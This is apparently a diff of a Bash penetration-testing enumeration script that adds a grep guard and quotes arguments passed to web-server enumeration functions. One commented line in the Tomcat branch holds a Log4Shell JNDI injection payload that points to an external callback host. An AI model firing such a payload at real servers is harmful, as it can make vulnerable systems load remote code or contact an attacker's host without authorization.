@@ -907,10 +907,12 @@ function enumeracionCMS () {
 		grep -qi wordpress logs/enumeracion/"$host"_"$port-$path_web_sin_slash"_webDataInfo.txt
 		greprc=$?
 		if [[ $greprc -eq 0 ]];then
-			newdomain=$(cut -d '^' -f3 "logs/enumeracion/${host}_${port}-${path_web_sin_slash}_webDataInfo.txt")
-			if [ -n "$newdomain" ]; then
+
+			grep -qi "^" "logs/enumeracion/${host}_${port}-${path_web_sin_slash}_webDataInfo.txt"
+			greprc=$?
+			if [[ $greprc -eq 0 ]];then
+				newdomain=$(cut -d '^' -f3 "logs/enumeracion/${host}_${port}-${path_web_sin_slash}_webDataInfo.txt")
 				host=$newdomain
-				#
 			fi
 
 			if [[ "$port" != "80" && "$port" != '443' ]];then
@@ -1601,7 +1603,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
 						checkRAM
-						enumeracionApache "$proto_http" $host $port $msg_error_404
+						enumeracionApache "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 
@@ -1610,7 +1612,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es nginx y no se enumero antes
 						checkRAM
-						enumeracionApi "$proto_http" $host $port $msg_error_404
+						enumeracionApi "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					
 
@@ -1619,7 +1621,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es SharePoint
 						checkRAM
-						enumeracionSharePoint "$proto_http" $host $port $msg_error_404
+						enumeracionSharePoint "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 
@@ -1628,7 +1630,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes
 						checkRAM
-						enumeracionIIS "$proto_http" $host $port $msg_error_404
+						enumeracionIIS "$proto_http" "$host" "$port" "$msg_error_404"
 					fi
 					####################################
 					
@@ -1637,7 +1639,7 @@ for line in $(cat $TARGETS); do
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
 						checkRAM
-						enumeracionTomcat "$proto_http" $host $port $msg_error_404
+						enumeracionTomcat "$proto_http" "$host" "$port" "$msg_error_404"
 						#  ${jndi:ldap://z4byndtm.requestrepo.com/z4byndtm}   #log4shell
 					fi
 					####################################
